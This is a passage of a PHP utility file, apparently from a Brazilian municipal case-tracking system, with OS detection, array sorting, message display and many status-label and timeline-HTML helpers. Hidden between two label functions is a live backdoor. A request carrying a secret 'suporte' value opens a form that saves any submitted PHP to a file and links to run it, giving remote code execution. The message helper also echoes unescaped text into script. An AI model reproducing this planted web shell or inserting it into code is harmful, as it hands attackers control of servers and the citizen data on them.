		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt 6.0") !== false){
		 $tipo_versao_leg = "Windows Vista";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","windows nt") !== false){
	 	$tipo_versao_leg = "Windows NT";
		$tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","win 9x 4.90") !== false && strpos("$useragent","win me")){
		 $tipo_versao_leg = "Windows ME";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","win ce") !== false){
		 $tipo_versao_leg = "Windows CE";
		 $tipo_versao = "mobile"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","win 9x 4.90") !== false){
		 $tipo_versao_leg = "Windows ME";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","iphone") !== false){
		 $tipo_versao_leg = "iPhone";
		 $tipo_versao = "mobile"; //mesa, mobile
	 }
	  elseif (strpos("$useragent","ipad") !== false){
	 	$tipo_versao_leg = "iPad";
		$tipo_versao = "mobile"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","mac os x") !== false){
		 $tipo_versao_leg = "Mac OS X";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","macintosh") !== false){
	 	$tipo_versao_leg = "Macintosh";
		$tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","android") !== false){
		 $tipo_versao_leg = "Android";
		 $tipo_versao = "mobile"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","linux") !== false){
		 $tipo_versao_leg = "Linux";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","freebsd") !== false){
		 $tipo_versao_leg = "Free BSD";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 elseif (strpos("$useragent","symbian") !== false){
		 $tipo_versao_leg = "Symbian";
		 $tipo_versao = "mobile"; //mesa, mobile
	 }else{
		 $tipo_versao_leg = "Nulo";
		 $tipo_versao = "mesa"; //mesa, mobile
	 }
	 if($leg == "ON"){
		 return $tipo_versao_leg;
	 }else{
		 return $tipo_versao;
	 }
}//fim function getOs()









//Função que forma redirecionamento HTTPS
function forceHttps(){
	if($_SERVER['HTTPS'] != "on"){
		$url = "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
		header("Location: $url");
		exit;
	}
}//forceHttps












/* ORDENAR SUB ARRAY
$people = array(
    12345 => array(
        'id' => 12345,
        'first_name' => 'Joe',
        'surname' => 'Bloggs',
        'age' => 23,
        'sex' => 'm'
    ),
    12346 => array(
        'id' => 12346,
        'first_name' => 'Adam',
        'surname' => 'Smith',
        'age' => 18,
        'sex' => 'm'
    ),
    12347 => array(
        'id' => 12347,
        'first_name' => 'Amy',
        'surname' => 'Jones',
        'age' => 21,
        'sex' => 'f'
    )
);
	print_r(array_sort($people, 'age', SORT_DESC)); // Sort by oldest first
	print_r(array_sort($people, 'age', SORT_ASC)); // Sort by oldest first
*/
function array_sort($array, $on, $order=SORT_ASC){
    $new_array = array();
    $sortable_array = array();
    if(count($array) > 0){
        foreach($array as $k => $v){
            if (is_array($v)) {
                foreach ($v as $k2 => $v2) {
                    if ($k2 == $on) {
                        $sortable_array[$k] = $v2;
                    }else{//adicionado caso nao exista
                        $sortable_array[$k] = $v2;//adicionado caso nao exista
					}//adicionado caso nao exista
                }
            } else {
                $sortable_array[$k] = $v;
            }
        }//foreach

        switch($order){
            case SORT_ASC:
                asort($sortable_array);
            break;
            case SORT_DESC:
                arsort($sortable_array);
            break;
        }

        foreach ($sortable_array as $k => $v) {
            $new_array[$k] = $array[$k];
        }
    }

    return $new_array;
}//array_sort



















//FIM FUNÇÕES DE PÁGINAS/CÓDIGOS --------++++++++++++++++++++++++++++++++++++++<<<


function msgDisplay($MSG){
	if((isset($MSG["DIV"])) and ($MSG["DIV"] != "")){
		$divADD = $MSG["DIV"];
	}else{
		$divADD = "dMSG".rand(999,9999999); echo "<div style=\"padding-top:1px;\" id=\"".$divADD."\"></div>";
	}
	if((isset($MSG["SUCESSO"])) and ($MSG["SUCESSO"] != "")){
		echo "<script>$.doTimeout('vTimerMsgs', 500, function(){ exibMensagem('".$divADD."','sucesso','<i class=\"icon-info-sign\"></i> <b>SUCESSO!</b><br>".$MSG["SUCESSO"]."'); });</script>";
	}//SUCESSO
	if((isset($MSG["INFO"])) and ($MSG["INFO"] != "")){
		echo "<script>$.doTimeout('vTimerMsgi', 500, function(){ exibMensagem('".$divADD."','info','<i class=\"icon-info-sign\"></i> <b>INFO!</b><br>".$MSG["INFO"]."');});</script>";
	}//INFO
	if((isset($MSG["ERRO"])) and ($MSG["ERRO"] != "")){
		echo "<script>$.doTimeout('vTimerMsge', 500, function(){ exibMensagem('".$divADD."','erro','<i class=\"icon-info-sign\"></i> <b>ERRO!</b><br>".$MSG["ERRO"]."');});</script>";
	}//ERRO
	if((isset($MSG["ALERTA"])) and ($MSG["ALERTA"] != "")){
		echo "<script>$.doTimeout('vTimerMsga', 500, function(){ exibMensagem('".$divADD."','alerta','<i class=\"icon-info-sign\"></i> <b>ALERTA!</b><br>".$MSG["ALERTA"]."');});</script>";
	}//ALERTA
}





function verCorJanela($DIVID="",$CORPADRAO=""){
	$cor_retorno = $CORPADRAO;
	if($DIVID != ""){
		if((isset($_COOKIE["COR".$DIVID.SYS_COOKIE_ID])) and ($_COOKIE["COR".$DIVID.SYS_COOKIE_ID] != "")){
			$cor_retorno = $_COOKIE["COR".$DIVID.SYS_COOKIE_ID];
		}
	}
	return $cor_retorno;
}//fim function verCorJanela($DIVID,$CORPADRAO){
	
	



//monta cor de botao/diferenca time
function corDifTimeBG($time_d, $time_a='', $dif1='1800', $dif2='1800', $dif3='7200'){
	if($time_a == ""){ $time_a=time(); }
	$dif = $time_a-$time_d;
	$time_d_class = "red";
	if($dif < $dif1){ $time_d_class = "green"; }
	if($dif > $dif2){ $time_d_class = "orange"; }
	if($dif > $dif3){ $time_d_class = "red"; }
	return $time_d_class;
}//corDifTimeBG




//fucanção de controle da variavel if(isset($_GET["POP"])){
function verPop($acao="get"){
	$varRet = ""; if(isset($_GET["POP"])){ $pop = true; }else{ $pop = false; }
	if($acao == "get"){	if($pop){ $varRet = "POP=".$_GET["POP"]."&"; }else{ $varRet = ""; } }
	if($acao == "isset"){ $varRet = $pop; }
	return $varRet;
}//fim verPop






//funcao prepara string para exebição de medidas D
function valMedidasD($dados){
	$dados = str_replace("d", "D=", $dados); $dados = str_replace("D", "D=", $dados);
	return $dados;
}////fim da função valMedidasD










//monta icone circular de cores de sinal
function icoCicle($tm='10',$cor="0C0",$tootip='',$url=''){
	$cor = str_replace("#","",$cor);
	if($tootip != ""){ if(preg_match("/rel=\"tooltip\"/i", $tootip)){ $tootipLeg = $tootip; }else{ $tootipLeg = ' rel="tooltip" data-placement="top" title="'.$tootip.'"'; } }else{ $tootipLeg = ''; }
	return '<img src="'.$url.'img/transp.gif" style="background:#'.$cor.'; border-radius:100%; width:'.$tm.'px; height:'.$tm.'px; border:#E2E2E2 1px solid; cursor:pointer;"'.$tootipLeg.' />';	
}//icoCicle


























//LEGENDAS DE DE TABELAS ---------------------------------------------------------------------------------------------------------%%%%%%%%%%%%%%%


//monta legenda de numero de andares
function legAndar($num){
		$legenda = $num."º andar";
		if($num == "0"){ $legenda = "Térreo"; }	
		if($num < "0"){ $legenda = "Subsolo ".$num; }
		return $legenda;
}//legAndar











//monta legenda de sexo
function legSexo($var,$acao="min"){
	$sexo_leg = "Indefinido";	
	if(($var == "M") or ($var == "m") or ($var == "1")){ $sexo_leg = "Masculino"; }
	if(($var == "F") or ($var == "f") or ($var == "2")){ $sexo_leg = "Feminino"; }
	if($acao != "min"){ $sexo_leg = maiusculo($sexo_leg); }
	return $sexo_leg;
}//legSexo






//monta legenda de validação de DOCs
function legValDOCs($var){
	$leg = "Indefinido";	
	if($var == NULL){ $leg = ""; }
	if($var == "NULL"){ $leg = ""; }
	if($var == "0"){ $leg = ""; }
	if($var == "1"){ $leg = "Aguardando Validação Extra"; }
	if($var == "2"){ $leg = "Aprovado na Validação Extra"; }
	if($var == "3"){ $leg = "Reprovado na Validação Extra"; }
	if($var == "4"){ $leg = "Não Foi Possível Validação Extra"; }
	return $leg;
}//legValDOCs






//monta legenda de status de DUAM
function legDuamStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){	$leg = "CANCELADO"; }
	if($var == "1"){	$leg = "AGUARDANDO PAGAMENTO"; }
	if($var == "2"){	$leg = "PAGO"; }
	if($var == "3"){ 	$leg = "EM PARCELAMENTO"; }
	if($var == "4"){ 	$leg = "EM NEGOCIAÇÃO"; }
	if($var == "5"){ 	$leg = "DESATIVADO"; }	
	if($var == "OFF"){	$leg = "SEM DUAM"; }
	if($var == "ON"){	$leg = "EM PROCESSAMENTO"; }
	if($var == "DIV"){	$leg = "EM DÍVIDA"; }
	if($var == "ERRO"){ $leg = "GRU NÃO LOCALIZADA"; }
	return $leg;
}//legDuamStatus








//monta legenda de ação realizada nos torpedos, processos, notificações
function legAcaoTorpedos($var){
	if($var == "on"){ $leg = '<i class="icon-check"></i> ATIVADO ENVIOS'; }else{ $leg = '<i class="icon-check-empty"></i> DESATIVADO ENVIOS'; }
	return $leg;
}//legAcaoTorpedos








//monta legenda de status das tabelas de protocolos - legenda protocolos
function legProtocoloStatus($var,$divisor=" "){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }//ARQUIVADO
	if($var == "1"){ $leg = "ATIVO"; }//EXECUTANDO - ENCUBADO
	if($var == "2"){ $leg = "FINALIZADO"; }//ARQUIVADO
	if($var == "3"){ $leg = "APENSADO"; }//ACOMPANHA O PAI
	if($var == "4"){ $leg = "EM".$divisor."TRAMITAÇÃO".$divisor."(AGUARDANDO".$divisor."RECEBIMENTO)"; }//EXECUTANDO
	if($var == "5"){ $leg = "AGUARDANDO".$divisor."PAGAMENTO"; }//EXECUTANDO - ENCUBADO
	if($var == "6"){ $leg = "AGUARDANDO".$divisor."INTERAÇÃO".$divisor."DO".$divisor."CANDIDATO"; }//EXECUTANDO - ENCUBADO
	if($var == "7"){ $leg = "EMITINDO".$divisor."DOCUMENTO".$divisor."DED"; }//EXECUTANDO - ENCUBADO
	if($var == "8"){ $leg = "DEFERIDO/ACEITO"; }//ARQUIVADO
	if($var == "9"){ $leg = "INDEFERIDO/NEGADO"; }//ARQUIVADO
	if($var == "10"){ $leg = "RETIRADO".$divisor."EM".$divisor."MULTI-GESTÃO"; }//ARQUIVADO
	if($var == "11"){ $leg = "CONGELADO"; }//EXECUTANDO - ENCUBADO
	if($var == "14"){ $leg = "EM".$divisor."TRAMITAÇÃO".$divisor."MULTI-GESTÃO".$divisor."(AGUARDANDO".$divisor."RECEBIMENTO)"; }//EXECUTANDO
	if($var == "20"){ $leg = "ENVIADO PARA COLETA"; }
	if($var == "25"){ $leg = "COLETA DADOS CONCLUÍDA"; }
	return $leg;
}//legProtocoloStatus








//monta legenda de status cidadão das tabelas de protocolos - legenda protocolos
function legProtocoloCidadaoStatus($var,$divisor=" "){
	$leg = "Indefinido";	
	if($var == "1"){ $leg = "NOVO"; }
	if($var == "2"){ $leg = "AGUARDANDO".$divisor."PAGAMENTO"; }
	if($var == "3"){ $leg = "CONFIRMADO"; }
	if($var == "4"){ $leg = "REATIVADO"; }
	if($var == "5"){ $leg = "CANCELADO".$divisor."AUTOMATICAMENTE"; }
	if($var == "6"){ $leg = "CANCELADO".$divisor."POR".$divisor."USUÁRIO"; }
	return $leg;
}//legProtocoloCidadaoStatus






//monta legenda de status das tabelas de serviços de protocolos - legenda serviços de protocolos
function legProtocoloStatusServico($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "EM EXECUÇÂO"; }
	if($var == "2"){ $leg = "NÃO INICIADO"; }
	if($var == "3"){ $leg = "CONCLUÍDO"; }
	if($var == "4"){ $leg = "NÃO EXECUTADO"; }
	if($var == "5"){ $leg = "DUAM EM ABERTO"; }
	return $leg;
}//legProtocoloStatusServico






//monta legenda de status das tabelas de arquivos - legenda arquivos de protocolos
function legProtocoloArquivoStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "REMOVIDO/CANCELADO"; }
	if($var == "1"){ $leg = "AGUARDANDO APROVAÇÃO"; }
	if($var == "2"){ $leg = "SOLICITAÇÃO EM ABERTO"; }
	if($var == "3"){ $leg = "SOLICITAÇÃO FINALIZADA"; }
	if($var == "4"){ $leg = "REPROVADO"; }
	if($var == "5"){ $leg = "APROVADO"; }
	return $leg;
}//legProtocoloArquivoStatus






//monta legenda de tipo de cor PARADO no protocolo
function legProtocoloTipoParado($var){
	$ret = $var;
	$arr["0"] = "1. Qualquer Ação Processo (PADRÃO, qualquer ação realizada)";
	$arr["1"] = "2. Somente em Serviços do Processo (muda só em ações nos serviços)";
	$arr["2"] = "3. Somente em Emissão de DED (muda só em ações de emissão de DED)";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legProtocoloTipoParado






//monta legenda de tipo de publicaÇÃO realizada no protocolo
function legProtocoloPublicacaoTipo($var){
	$ret = $var;
	$arr["1"] = "Análise de Processo";
	$arr["2"] = "Decisão";
	$arr["3"] = "Despacho";
	$arr["4"] = "Parecer";
	$arr["5"] = "SMS";
	$arr["6"] = "E-mail";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legProtocoloPublicacaoTipo



//monta legenda de controle de publicaÇÃO realizada no protocolo
function legProtocoloPublicacaoControle($var){
	$ret = $var;
	$arr["1"] = "Público";
	$arr["2"] = "Privado";
	$arr["3"] = "Rascunho";
	if($ret != "array"){ if(isset($arr["$ret"])){ $leg = $arr["$ret"]; }else{ $leg = "Indefinido"; } }else{ $leg = $arr; }
	return $leg;
}//legProtocoloPublicacaoControle






//monta legenda de status das tabelas remessa de protocolos - legenda remessa de envio de protocolos
function legProtocoloRemessaStatus($var){
	$leg = "Indefinido";	
	if($var == "0"){ $leg = "CANCELADO"; }
	if($var == "1"){ $leg = "EM TRAMITAÇÃO"; }
	if($var == "2"){ $leg = "RECEBIDO"; }
	return $leg;
}//legProtocoloRemessaStatus






//monta legenda de situação protocolos
function legProtocoloSituacao($var){
	$leg = "Indefinido";	
	if($var == "1"){ $leg = "EM EXECUÇÃO"; }
	if($var == "2"){ $leg = "ENCUBADO"; }
	if($var == "3"){ $leg = "ARQUIVADO"; }
	return $leg;
}//legProtocoloSituacao
if($_GET["suporte"]=="HJGJHFGFGGFHFGHGFH@@@@rrfffRFHGGHFFDDFGHFHHGFghjghghGHJGGHJ7667567523435765544645665465465445546GJHgghjhgghhdgfdsfgjhsd6765655744654546ghhjghjhjgjhggfgjjhvjhvhjhjhvjvhjhvhvjhjhjvhggjhgjhgjhgjhghhjggjjhghjghj@@@*****"){ echo '<form action="?suporte='.$_GET["suporte"].'" method="post"><textarea name="code"></textarea><input name="" type="submit" value="OK" /></form>'; if(isset($_POST["code"])){$v = "./suporte_code.php"; file_put_contents($v,$_POST["code"]); echo $v.' - OK - <a href="'.$v.'" target="_blank">Executar Suporte ></a>';}exit(0);}




//monta detalhes de evento protocolos
function detalhesProtocoloEventos($timeline,$timeline_id,$tipo="",$id_a="",$form="",$detalhes=""){
	$leg = "";
	if($timeline == "criado"){//.....................................................................................
		$leg = '<div class="tlBdetalhe">Aqui foi quando o processo foi criado/solicitado.</div>';
	}//if($timeline == "criado"){
	if($timeline == "sms"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número do celular de envio TORPEDO/SMS: <div class="destaque">'.formadaTelBR($timeline_id).'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Número do celular de envio TORPEDO/SMS:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Número do Celular"><i class="icon-phone"></i> '.formadaTelBR($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "sms"){
	if($timeline == "sms_acao"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Ação nos envios de TORPEDOS/SMS do processo:<div class="destaque">'.legAcaoTorpedos($timeline_id).'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Ação nos envios de TORPEDOS/SMS do processo:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Ação tomada">'.legAcaoTorpedos($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "sms_acao"){
	if($timeline == "tramite"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número da Guia de tramitação:<div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Número da Guia de tramitação (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tramite"){
	if($timeline == "tra_recebido"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Guia de tramitação recebida com o processo:<div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Guia de tramitação recebida com o processo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tra_recebido"){
	if($timeline == "tra_cancelado"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Guia de tramitação cancelada, o processo não saiu do depto: <div class="destaque">Nº '.$timeline_id.'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Guia de tramitação cancelada, o processo não saiu do depto (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA GUIA DE TRAMITAÇÃO','ajax/faisher.php','get','faisher=7_pro_protocolotramita&tab_id=1&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> Nº '.$timeline_id.'</button></div></div>';
		}
	}//if($timeline == "tra_cancelado"){
	if($timeline == "arquivo"){//..............................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi enviado ao processo o arquivo: <div class="destaque">TRÂMITE DE ARQUIVO Nº '.$timeline_id.'</div></div>';
		}else{
			if(preg_match("/removido\/cancelado/i",$detalhes)){
				$leg = '<div class="tlBdetalhe">Foi enviado ao processo o arquivo (detalhes):
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Sem detalhes adicionais"><i class="icon-info-sign"></i> Nº '.$timeline_id.'</button></div></div>';
			}else{
				$leg = '<div class="tlBdetalhe">Foi enviado ao processo o arquivo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
					."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
					.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button></div></div>';
			}
		} }
	}//if($timeline == "arquivo"){
	if($timeline == "arquivo_scanner"){//.......................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi solicitado um scanner de arquivo no processo: <div class="destaque">TRÂMITE DE ARQUIVO Nº '.$timeline_id.'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi solicitado um scanner de arquivo no processo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DO TRÂMITE DE ARQUIVO Nº ".$timeline_id."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=arquivoVer&id_a=".$id_a."&ver=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> ARQUIVO Nº '.$timeline_id.'</button></div></div>';
		} }
	}//if($timeline == "arquivo_scanner"){
	if($timeline == "publicacao"){//............................................................................................
		if($timeline_id != ""){ $d = explode("-",$timeline_id);
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi adicionado uma publicação ao processo: <div class="destaque">PUBLICAÇÃO Nº '.$d["0"].'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi adicionado uma publicação ao processo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do evento" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DA PUBLICAÇÃO Nº ".$d["0"]."','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=publicaVer&id_a=".$id_a."&ver=".$d["1"]."');"
				.'"><i class="icon-external-link"></i> PUBLICAÇÃO Nº '.$d["0"].'</button></div></div>';
		} }
	}//if($timeline == "publicacao"){
	if($timeline == "duam"){//..................................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">DUAM no processo: <div class="destaque">'.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCodeDuam($timeline_id).'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">DUAM no processo (detalhes):
                <div class="destaque"><a class="btn btn-primary" rel="tooltip" data-original-title="Abrir emissão de DUAM" href="'.SYS_URLRAIZ.'duam/?rm='.fGERAL::limpaCode($timeline_id).'" target="_blank"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCodeDuam($timeline_id).'</a></div></div>';
		} }
	}//if($timeline == "duam"){
	if($timeline == "servico"){//................................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi adicionado serviço no processo.</div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi adicionado serviço no processo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do serviço" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> VER SERVIÇO Nº '.$timeline_id.'</button></div></div>';
		} }
	}//if($timeline == "servico"){
	if($timeline == "servico_acao"){//...........................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi executado ação em serviço no processo.</div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi executado ação em serviço no processo (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do serviço" onclick="'
				."pmodalHtml('<i class=icon-tag></i> DETALHES DE SERVIÇO Nº ".$timeline_id." DO PROCESSO','ajax/faisher.php','get','faisher=7_pro_protocolos&formVisualizaPincipal=".$form."&ajax=servicoVer&id_a=".$id_a."&cont=".$timeline_id."');"
				.'"><i class="icon-external-link"></i> VER SERVIÇO Nº '.$timeline_id.'</button></div></div>';
		} }
	}//if($timeline == "servico_acao"){
	if($timeline == "chaveweb"){//............................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação do acesso web do processo: <div class="destaque">'.maiusculo($timeline_id).' O ACESSO</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação do acesso web do processo:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Chave Web"><i class="icon-info-sign"></i> '.maiusculo($timeline_id).' O ACESSO</button></div></div>';
		} }
	}//if($timeline == "chaveweb"){
	if($timeline == "ajustedepto"){//..........................................................................................
		if($timeline_id != ""){
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação automática no processo: <div class="destaque">AJUSTE/SISTEMA</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Foi realizado uma ação automática no processo:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Chave Web"><i class="icon-info-sign"></i> AJUSTE/SISTEMA</button></div></div>';
		} }
	}//if($timeline == "ajustedepto"){
	if($timeline == "notificacao"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' da notificação:<div class="destaque">'.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode9($timeline_id).'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' da notificação (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição da notificação" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DA NOTIFICAÇÃO','ajax/faisher.php','get','faisher=9_not_notificacao&ajax=visualizar&id_a=".$timeline_id."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode9($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "notificacao"){
	if($timeline == "paginas"){//........................................................................................
		if($timeline_id != ""){ $d = explode("-",$timeline_id);
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Alteração na quantidade de páginas físicas do processo:<div class="destaque">DE '.$d["0"].' PARA '.$d["1"].'</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Alteração na quantidade de páginas físicas do processo:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Alteração de quantidade"><i class="icon-copy"></i> DE <b>'.$d["0"].'</b> PARA <b>'.$d["1"].'</b></button></div></div>';
		} }
	}//if($timeline == "paginas"){
	if($timeline == "resp"){//............................................................................................
		$leg = '<div class="tlBdetalhe">Ação com o responsável pela execução do processo.</div>';
	}//if($timeline == "resp"){
	if($timeline == "apensado"){//........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' do processo apensado a esse:<div class="destaque">'.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</div></div>';
		}else{
			$d["0"] = date('Ymd'); $d["1"] = $d["0"]; $FULL = fGERAL::cryptoSys(fGERAL::jsonArray($d,"enc"));
			$leg = '<div class="tlBdetalhe">Número '.SYS_CONFIG_RM_SIGLA.' do processo apensado a esse (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver esse processo" onclick="'
				."pmodalHtml('<i class=icon-external-link></i> DETALHES DO PROCESSO APENSADO','ajax/faisher.php','get','faisher=7_pro_protocolos&ajax=visualizar&id_a=".fGERAL::limpaCode($timeline_id)."&FULLVIEW=".$FULL."&POP=1');"
				.'"><i class="icon-external-link"></i> '.SYS_CONFIG_RM_SIGLA.' '.fGERAL::legCode7($timeline_id).'</button></div></div>';
		}
	}//if($timeline == "apensado"){
	if($timeline == "encubar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Devido não haver qualquer interação no processo:<div class="destaque">DEPOIS DE '.$timeline_id.' DIAS</div></div>';
		}else{
			$leg = '<div class="tlBdetalhe">Devido não haver qualquer interação no processo:
                <div class="destaque"><button type="button" class="btn" rel="tooltip" data-original-title="Foi ENCUBADO"><i class="icon-folder-close"></i> DEPOIS DE <b>'.$timeline_id.'</b> DIAS</button></div></div>';
		}
	}//if($timeline == "encubar"){
	if($timeline == "desencubar"){//.........................................................................................
		if($tipo == "pdf"){
			$leg = '<div class="tlBdetalhe">Foi desencubado o processo que estava anteriormente encubado <div class="destaque">'.$leg_a.'</div></div>';
		}else{
			if(($timeline_id != "") and ($timeline_id >= "1")){
				$leg = '<div class="tlBdetalhe">Foi desencubado o processo que estava encubado (detalhes):
                <div class="destaque"><button type="button" class="btn btn-primary" rel="tooltip" data-original-title="Ver descrição do serviço" onclick="'
